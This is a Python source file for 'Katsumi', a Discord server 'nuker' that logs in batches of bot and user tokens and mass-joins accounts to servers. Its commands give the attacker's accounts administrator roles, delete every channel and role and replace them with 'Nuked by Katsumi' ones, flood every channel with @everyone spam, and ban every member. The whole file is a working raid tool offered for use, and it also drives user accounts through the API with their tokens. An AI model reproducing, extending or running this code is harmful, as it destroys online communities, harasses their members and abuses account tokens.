import colorama, requests, random, traceback, asyncio, json, os, pyfiglet, discord, traceback
from discord.ext import commands
from colorama import Fore, Back, Style
from concurrent.futures.thread import ThreadPoolExecutor

# ↓↓↓↓↓ IF YOU'RE RUNNING IN REPLIT AND HAVE YOUR .env LIKE THIS TOKENS=["token"] OR JUST HAVE YOUR TOKEN LIST IN .env SET THIS TO True ↓↓↓↓↓

envList = False

# ↑↑↑↑↑ IF YOU'RE RUNNING IN REPLIT AND HAVE YOUR .env LIKE THIS TOKENS=["token"] OR JUST HAVE YOUR TOKEN LIST IN .env SET THIS TO True ↑↑↑↑↑


# ADD .ENV FUNCTIONALITY FOR NEW TOKEN SYSTEM!!!!
#added? not debugged



f = pyfiglet.Figlet(font="shadow")
asciiArt = f.renderText
SRESET = Style.RESET_ALL
base_url = "https://discord.com/api/v9/"
clients = []
startCheck = []
count0 = 0 # spamming
count1 = 0 # creating channels
count2 = 0 # removing channels
count3 = 0 # creating roles
count4 = 0 # removing roles
count5 = 0 # server info and perms
count6 = 0 # banning
prCount = 0 
lastPr = ""

with open("icon.jpg", "rb") as f:
  icon = f.read()

#def getTokens():
#	if envList == True:
#		tokens = os.getenv("TOKENS")
#		return json.loads(tokens)
#	with open("tokens.txt", "r") as f:
#	  return f.readlines()

def getTokens():
	if envList == True:
		tkns = os.getenv("TOKENS")
		return json.loads(tkns)
	with open("tokens.json", "r") as f:
		tkns = json.load(f)
	return tkns

def setTokens(jsonTkns):
	global tokens
	tokens = jsonTkns
	if envList == True:
		os.environ["TOKENS"] = json.dumps(jsonTkns)
		return
	with open("tokens.json", "w") as f:
		json.dump(jsonTkns, f)

tokens = getTokens()

def getSettings():
	with open("settings.json", "r") as f:
		stngs = json.load(f)
	return stngs

def setSettings(jsonStngs):
	with open("settings.json", "w") as f:
		json.dump(jsonStngs, f)

settings1 = getSettings()
def settingsFirstRun():
	if len(settings1) == 0:
	  message = []
	  for i in range(15):
	    message.append("@everyone Nuked by Katsumi")
	  message = " | ".join(message)
	  settings1["message"] = str(message)
	  settings1["givePerms"] = True
	  settings1["channelNames"] = ["nuked-by-katsumi","katsumi-nuked-you","katsumi-on-top", "raided-by-katsumi"]
	  settings1["roleNames"] = ["Nuked by Katsumi", "Katsumi nuked you","Katsumi on top","Raided by Katsumi"]
	  settings1["firstRun"] = True
	  setSettings(settings1)
	  settings = getSettings()
	#settings = json.dumps(settings)
	else:
	  settings = settings1
	with open("settings.json", "w") as fA:
	  json.dump(settings, fA)
	return settings
settings = settingsFirstRun()
getMessage = settings["message"]
givePerms = settings["givePerms"]
channelNames = settings["channelNames"]
roleNames = settings["roleNames"]

def getChannelName():
	return random.choice(channelNames)
def getRoleName():
	return random.choice(roleNames)
def getRandomColor():
  return random.randint(0x00000, 0xFFFFF)

# def getTokens():
# 	with open("tokens.txt", "r") as f:
# 	  return f.readlines()

def cls():
	os.system("cls" if os.name == "nt" else "clear")

async def async_input(prompt: str = "") -> str:
	with ThreadPoolExecutor(1, "AsyncInput") as executor:
		return await asyncio.get_event_loop().run_in_executor(executor, input, prompt)

async def mainMenu():
#	cls()
	print(Fore.GREEN + "\n\n\n" + asciiArt("Katsumi"))
	print("\n")
	print(Fore.GREEN + Style.BRIGHT + "\n[1] " + Style.NORMAL + "Token Menu | " + Style.DIM + "[gives you the list of your tokens including types, also allows to add tokens]\n" + SRESET)
	print(Fore.GREEN + Style.BRIGHT + "\n[2] " + Style.NORMAL + "Start Nuker | " + Style.DIM + "[startne každý token v tokens.txt, ujisti se že fungují]\n" + SRESET)
	print(Fore.GREEN + Style.BRIGHT + "\n[3] " + Style.NORMAL + "Token Checker | " + Style.DIM + "[checkne každý token v tokens.txt zda funguje]\n" + SRESET)
	print(Fore.GREEN + Style.BRIGHT + "\n[4] " + Style.NORMAL + "Credits | " + Style.DIM + "[ukáže ty všechny, co na tomto pracovali]\n" + SRESET)
	print(Fore.GREEN + Style.BRIGHT + "\n[5] " + Style.NORMAL + "Server Joiner | " + Style.DIM + "[joine každý user token v tokens.json]\n" + SRESET)
	try:
		inputInteger = int(await async_input(Fore.YELLOW + Style.BRIGHT + "\n[~] " + Style.NORMAL + "Choose | " + Style.DIM + "[every function has a number before it, choose them from the number]\n" + SRESET))
		#print(inputInteger)
		if inputInteger == 1:
			loop.create_task(addTokenMenu())
		elif inputInteger == 2:
			loop.create_task(nukerMenu())
		elif inputInteger == 3:
			loop.create_task(tokenCheckerMenu())
		elif inputInteger == 4:
			loop.create_task(creditsMenu())
		elif inputInteger == 5:
			loop.create_task(joinerMenu())
		else:
			await mainMenu()
	except:
		await mainMenu()



async def firstRunMenu():
	cls()
	print(Fore.GREEN + "\n\n\n" + asciiArt("Katsumi"))
	print("\n")
	print(Fore.YELLOW + Style.BRIGHT + "\n[!] " + Style.NORMAL + "It looks like it's the first time you're running this nuker, make sure to have every step in the GitHub repository done so you know what you're doing! | " + Style.DIM + "GitHub repository: github.com/asxlvm/Katsumi\n" + SRESET)
	try:
		input_ = await async_input(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "If you have done everything, press anything\n" + SRESET)
		setngs = getSettings()
		setngs["firstRun"] = False
		setSettings(setngs)
		if input_:
			await mainMenu()
		else:
			await mainMenu()
	except:
		await mainMenu()

async def redirector(typeOfRun):
	if typeOfRun == False:
		return await mainMenu()
	else:
		return await firstRunMenu()

async def joinerMenu():
	userAccounts = []
	inviteCode = str(await async_input("code"))
	for token, type in tokens.items():
		if type["type"] == "User":
			userAccounts.append(token)
	for user in userAccounts:
		header = {"Authorization": user}
		r = requests.post(base_url + "invites/" + inviteCode, headers=header)
		print(r.json())
	await mainMenu()

def pprintTokenInfo():
  tokens = getTokens()
  tkns = []
  if len(tokens) == 0:
    tkns.append("No tokens.")
  for token, type in tokens.items():
    tkns.append(f"{token} | {type['type']}")
  return tkns
  

async def addTokenMenu():
  print(Fore.GREEN + "\n\n\n" + asciiArt("Token Adder"))
  print("\n")
  print(Fore.GREEN + Style.BRIGHT + "\n[~] " + Style.NORMAL + "Current Tokens\n" + Style.NORMAL + "\n".join(pprintTokenInfo()) + SRESET)
  print(Fore.GREEN + Style.BRIGHT + "\n[1] " + Style.NORMAL + "Add a Token | " + Style.DIM + "[need to have internet connection for type checking]\n" + SRESET)
  print(Fore.GREEN + Style.BRIGHT + "\n[2] " + Style.NORMAL + "Back to Main Menu | " + Style.DIM + "[return to main menu]\n" + SRESET)
  print(Fore.GREEN + Style.BRIGHT + "\n[3] " + Style.NORMAL + "Remove a Token | " + Style.DIM + "[removes a token from your token dict]\n" + SRESET)
  try:
  	inputInteger = int(await async_input(Fore.YELLOW + Style.BRIGHT + "\n[~] " + Style.NORMAL + "Choose | " + Style.DIM + "[every function has a number before it, choose them from the number]\n" + SRESET))
  	if inputInteger == 1:
  		loop.create_task(addToken())
  	elif inputInteger == 2:
  		loop.create_task(mainMenu())
  	elif inputInteger == 3:
  	  loop.create_task(removeToken())
  	else:
  		await addTokenMenu()
  except:
  	await addTokenMenu()

async def removeToken():
  print(Fore.GREEN + Style.BRIGHT + "\n[~] " + Style.NORMAL + "Current Tokens\n" + Style.NORMAL + "\n".join(pprintTokenInfo()) + SRESET)
  print("\n")
  tokenRemoval = True
  while tokenRemoval == True:
    try:
      inputToken = str(await async_input(Fore.YELLOW + Style.BRIGHT + "\n[~] " + Style.NORMAL + "Type the Token that you want to remove | " + Style.DIM + "Just copy&paste your token so that you don't make any mistake.\n" + SRESET))
      tokensS = getTokens()
      tokensS.pop(inputToken)
      setTokens(tokensS)
      print(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Removed successfully\n" + SRESET)
    except KeyError:
      print(Fore.RED + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Couldn't remove a nonexistent token\n" + SRESET)
    except:
      pass
    inputInteger = int(await async_input(Fore.YELLOW + Style.BRIGHT + "\n[?] " + Style.NORMAL + "Wanna remove more tokens? | " + Style.DIM + "Type 1 if yes and 2 if no.\n" + SRESET))
    if inputInteger == 1:
      tokenRemoval = True
    else:
      tokenRemoval = False
  await mainMenu()
    
  

async def addToken():
	tokenAdding = True
	while tokenAdding is True:
	  try:
	  	inputString = str(await async_input(Fore.YELLOW + Style.BRIGHT + "\n[~] " + Style.NORMAL + "Type your Token | " + Style.DIM + "Just copy&paste your token so that you don't make any mistake.\n" + SRESET))
	  	tokenType = checkTokenNoVerbose(inputString)
	  	if tokenType == "Invalid":
	  		print(Fore.RED + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Invalid Token! | " + Style.DIM + f"{inputString} | Make sure you didn't make any mistake / put a space after it.\n" + SRESET)
	  	elif tokenType == "Bot":
	  		tokenss = getTokens()
	  		tokenss[inputString] = {"type": "Bot"}
	  		setTokens(tokenss)
	  		print(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Valid Bot Token! | " + Style.DIM + f"{inputString} | Added to Tokens.\n" + SRESET)
	  	elif tokenType == "User":
	  		tokenss = getTokens()
	  		tokenss[inputString] = {"type": "User"}
	  		setTokens(tokenss)
	  		print(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Valid User Token! | " + Style.DIM + f"{inputString} | Added to Tokens.\n" + SRESET)
	  	inputInteger = int(await async_input(Fore.YELLOW + Style.BRIGHT + "\n[?] " + Style.NORMAL + "Wanna add more tokens? | " + Style.DIM + "Type 1 if yes and 2 if no.\n" + SRESET))
	  	if inputInteger == 1:
	  		tokenAdding = True
	  	else:
	  		tokenAdding = False
	  except:
	  	await addToken()
	await mainMenu()
  
async def tokenCheckerMenu():
	#cls()
	print(Fore.GREEN + "\n\n\n" + asciiArt("Checker"))
	print("\n")
	await checkMany(tokens)

def checkTokenNoVerbose(token):
	headers = {"Authorization": token}
	r = requests.get(base_url + "users/@me", headers=headers)
	if r.status_code != 200:
		botHeaders = {"Authorization": f"Bot {token}"}
		rBot = requests.get(base_url + "users/@me", headers=botHeaders)
		if "message" in rBot.json():
			return "Invalid"
		else:
			return "Bot"
	else:
	  return "User"

def checkToken(token):
	headers = {"Authorization": token}
	r = requests.get(base_url + "users/@me", headers=headers)
	if r.status_code != 200:
		botHeaders = {"Authorization": f"Bot {token}"}
		rBot = requests.get(base_url + "users/@me", headers=botHeaders)
		if "message" in rBot.json():
			print(Fore.RED + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Invalid Token | " + Style.DIM + f"{token}\n" + SRESET)
			return False
		else:
			print(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Valid Bot Token | " + Style.DIM + f"{token}\n" + SRESET)
	else:
		print(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Valid Token | " + Style.DIM + f"{token}\n" + SRESET)
	return True

async def checkMany(tokens):
	for token in tokens:
	  checkToken(token)
	try:
		input_ = await async_input(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Done | " + Style.DIM + f"[press anything to go back]\n" + SRESET)
		if input_:
			return await mainMenu()
		else:
			return await mainMenu()
	except:
		return await mainMenu()

async def nukerMenu():
	tokenLoop = asyncio.get_event_loop()
	global controllerID
	controllerID = int(await async_input(Fore.RED + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Type your Discord ID | " + Style.DIM + f"[the commands will not run if you will not provide it]\n" + SRESET))
	for token, type in tokens.items():
		tokenLoop.create_task(loginToken(loop, controllerID, token, type["type"]))
	loop.create_task(runningMenu())

async def runningMenu():
	print(Fore.GREEN + "\n\n\n" + asciiArt("Katsumi"))
	print(Fore.GREEN + Style.BRIGHT + "\n[1] " + Style.NORMAL + "Server Joiner | " + Style.DIM +"[joins a server for every " + Style.NORMAL + "user " + Style.DIM + "token in your tokens]" + SRESET)
	print(Fore.GREEN + Style.BRIGHT + "\n[2] " + Style.NORMAL + "Back to Main Menu | " + Style.DIM +"[kills every running user] " + Style.DIM + SRESET)
	try:
		inputInteger = int(await async_input(Fore.YELLOW + Style.BRIGHT + "\n[~] " + Style.NORMAL + "Choose | " + Style.DIM + "[every function has a number before it, choose them from the number]\n" + SRESET))
		#print(inputInteger)
		if inputInteger == 1:
			loop.create_task(joinerMenu())
		elif inputInteger == 2:
			loop.create_task(closeClients())
		else:
			await runningMenu()
	except:
		await runningMenu()


def getClientsID():
	ids = []
	for clientI in clients:
		ids.append(clientI.user.id)
	return ids

async def loginToken(asyncloop, controllerID, token, tokenType):
	global clients
	botloop = asyncio.get_event_loop()
	if tokenType == "Bot":
	  intents = discord.Intents().all()
	  client = commands.Bot(command_prefix="!", fetch_offline_members=False, intents=intents)
	  client.add_cog(Nuker(client, controllerID))
	  botloop.create_task(client.start(token, bot=True))
	elif tokenType == "User":
	  client = commands.Bot(command_prefix="!", fetch_offline_members=False)
	  client.add_cog(Nuker(client, controllerID))
	  botloop.create_task(client.start(token, bot=False))
	botloop.run_forever
	clients.append(client)
	return

def safePrint(msg):
	global prCount, lastPr
	if lastPr == msg:
		return
	lastPr = msg
	prCount += 1
	print(msg)

class Nuker(commands.Cog):
	def __init__(self, client, controllerID):
		self.client = client
		self.controllerID = controllerID
	
	@commands.Cog.listener()
	async def on_ready(self):
		print(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Account added! | " + Style.DIM + f"{self.client.user.name}#{self.client.user.discriminator}\n" + SRESET)
	
	@commands.command()
	async def test(self, ctx):
		await ctx.send("test indeed")
	
	@commands.command(aliases=["gperms", "giveperms"])
	async def gp(self, ctx, nl: bool = False):
	  roleName = getRoleName()
	  safePrint(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Perms Transfer is starting! | " + Style.DIM + f"Going to try to give Administrator perms to your {len(clients)} nuker accounts\n" + SRESET)
	  if ctx.author.id != self.controllerID:
	    return
	  global count5
	  if nl is False:
	  	if count5 != 0:
	  		safePrint(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Perms Transfer already going on! | " + Style.DIM + f"Wait until the Perms Transfer ends\n" + SRESET)
	  		return
	  try:
	    highestRolePos = ctx.guild.get_member(self.client.user.id).top_role.position
	    if highestRolePos <= 0:
	      rolePos = highestRolePos
	    else:
	      rolePos = highestRolePos - 1
	    role = await ctx.guild.create_role(name=roleName, color=getRandomColor(), permissions=discord.Permissions(administrator=True))
	    await role.edit(position=rolePos)
	  except:
	    return
	  try:
	    controllerMmbr = ctx.guild.get_member(self.controllerID)
	    await controllerMmbr.add_roles(role)
	  except:
	    pass
	  for clientI in clients:
	    try:
	      id_ = clientI.user.id
	      mmbr = ctx.guild.get_member(id_)
	      await mmbr.add_roles(role)
	      count5 += 1
	    except:
	      traceback.print_exc()
	      pass
	  await asyncio.sleep(3)
	  if count5 != 0:
	    safePrint(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + f"Perms Transfer is done from account {self.client.user.name}#{self.client.user.discriminator}! | " + Style.DIM + f"Gave Administrator perms to {count5} out of {len(clients)} nuker accounts of yours on {ctx.guild.name}\n" + SRESET)
	  count5 = 0
	  
	
	@commands.command(aliases=["cspam", "channelspam"])
	async def cs(self, ctx, msgCount: int = None, nl: bool = False):
		if msgCount == None:
		  msgCount = 50
		if ctx.author.id != self.controllerID:
			return
		global count0
		if nl is False:
			if count0 != 0:
				safePrint(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Spam is already going on! | " + Style.DIM + f"Wait until the spam ends\n" + SRESET)
				return
		safePrint(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Spam is starting! | " + Style.DIM + f"Going to spam {msgCount} messages in #{ctx.channel.name}\n" + SRESET)
		#count0 = 0
		for i in range(msgCount):
			await ctx.send(getMessage)
			count0 += 1
			#await asyncio.sleep(0.5)
			if msgCount <= count0:
				await asyncio.sleep(3)
				safePrint(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Spam is done! | " + Style.DIM + f"Spammed {count0} messages in #{ctx.channel.name}\n" + SRESET)
				count0 = 0
				break
	
	@commands.command(aliases=["cnuke","channelnuke"])
	async def cn(self, ctx, channelCount: int= None, nl: bool = False):
		if channelCount == None:
		  channelCount = 50
		if ctx.author.id != self.controllerID:
			return
		global count1, count2
		if nl is False:
			if count2 != 0 or count1 != 0:
				safePrint(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Channel Nuke is already going on! | " + Style.DIM + f"Wait until the channel nuke ends\n" + SRESET)
				return
		for channel in ctx.guild.channels:
			await channel.delete(reason=getMessage)
			count2 += 1
		safePrint(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Channel Nuke is starting! | " + Style.DIM + f"Deleted every original channel and going to create {channelCount} Katsumi channels\n" + SRESET)
		for i in range(channelCount):
			txt = await ctx.guild.create_text_channel(getChannelName())
			count1 += 1
			await txt.send(getMessage)
			#await asyncio.sleep(0.3)
			if count1 >= channelCount:			
				await asyncio.sleep(3)
				safePrint(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Channel Nuke is done! | " + Style.DIM + f"Deleted {count2} original channel(s) and created {count1} Katsumi channels\n" + SRESET)
				count1 = 0
				count2 = 0
				break
	
	@commands.command(aliases=["gspam", "globalspam"])
	async def gs(self, ctx, msgCount: int= None, nl: bool = False):
		if msgCount == None:
		  msgCount = 50
		if ctx.author.id != self.controllerID:
		  return
		global count0
		if nl is False:
			if count0 != 0:
				safePrint(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Global Spam is already going on! | " + Style.DIM + f"Wait until the spam ends\n" + SRESET)
				return
		safePrint(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Global Spam is starting! | " + Style.DIM + f"Going to spam {msgCount} messages in every channel\n" + SRESET)
		for i in range(msgCount):
			for txtchannel in ctx.guild.text_channels:
			  await txtchannel.send(getMessage)
			  #await asyncio.sleep(0.5)
			count0 += 1
			if msgCount <= count0:
			  await asyncio.sleep(3)
			  safePrint(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Spam is done! | " + Style.DIM + f"Spammed {count0} messages in every channel\n" + SRESET)
			  count0 = 0
			  break
	
	@commands.command(aliases=["rnuke", "rolenuke"])
	async def rn(self, ctx, roleCount: int= None, nl: bool = False):
	  if roleCount == None:
	    roleCount = 50
	  if ctx.author.id != self.controllerID:
	    return
	  global count3, count4
	  if nl is False:
	  	if count3 != 0 or count4 != 0:
	  		safePrint(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Role Nuke is already going on! | " + Style.DIM + f"Wait until the role nuke ends\n" + SRESET)
	  		return
	  for role in ctx.guild.roles:
	    try:
	      await role.delete(reason=getMessage)
	      count4 += 1
	    except Exception:
	      continue
	  safePrint(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Role Nuke is starting! | " + Style.DIM + f"Deleted every original role and going to create {roleCount} Katsumi roles!\n" + SRESET)
	  for i in range(roleCount):
	    try:
	      await ctx.guild.create_role(name=getRoleName(), color=getRandomColor())
	      count3 += 1
	      if count3 >= roleCount:
	        await asyncio.sleep(3)
	        safePrint(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Role Nuke is done! | " + Style.DIM + f"Deleted {count4} original role(s) and created {count3} Katsumi roles!\n" + SRESET)
	        count3 = 0
	        count4 = 0
	        break
	    except:
	    	await asyncio.sleep(3)
	    	count3 = 0 
	    	count4 = 0 
	    	return safePrint(Fore.RED + Style.BRIGHT + "\n[!] " + Style.NORMAL + f"Role Nuke has failed for {self.client.user.name}#{self.client.user.discriminator}! | " + Style.DIM + f"{self.client.user.name} doesn't have permissions to create roles!\n" + SRESET)

	@commands.command(aliases=["bnuke", "bannuke"])
	async def bn(self, ctx, nl: bool = False):
	  if ctx.author.id != self.controllerID:
	    return
	  global count6
	  if nl is False:
	  	if count6 != 0:
	  		safePrint(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Ban Nuke is already going on! | " + Style.DIM + f"Wait until the ban nuke ends\n" + SRESET)
	  		return
	  userCount = 0
	  safePrint(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Ban Nuke is starting! | " + Style.DIM + f"Going to try to ban every member of {ctx.guild.name}!\n" + SRESET)
	  for user in ctx.guild.members:
	    try:
	    	if user.id in getClientsID() or user.id in [self.controllerID]:
	    		userCount += 1
	    		continue
	    	await user.ban(reason=getMessage)
	    	count6 += 1
	    	userCount += 1
	    except Exception:
	      continue
	  await asyncio.sleep(3)
	  safePrint(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Ban Nuke is done! | " + Style.DIM + f"Banned {count6} members out of {userCount} members!\n" + SRESET)
	  count6 = 0
	  userCount = 0
	  

if __name__ == "__main__":
	if startCheck == []:
	  global loop
	  startCheck.append("started")
	  loop = asyncio.get_event_loop()
	  sngs = getSettings()
	  settingsFirstRun()
	  loop.create_task(redirector(sngs["firstRun"]))
	  loop.run_forever()
	else:
	  pass
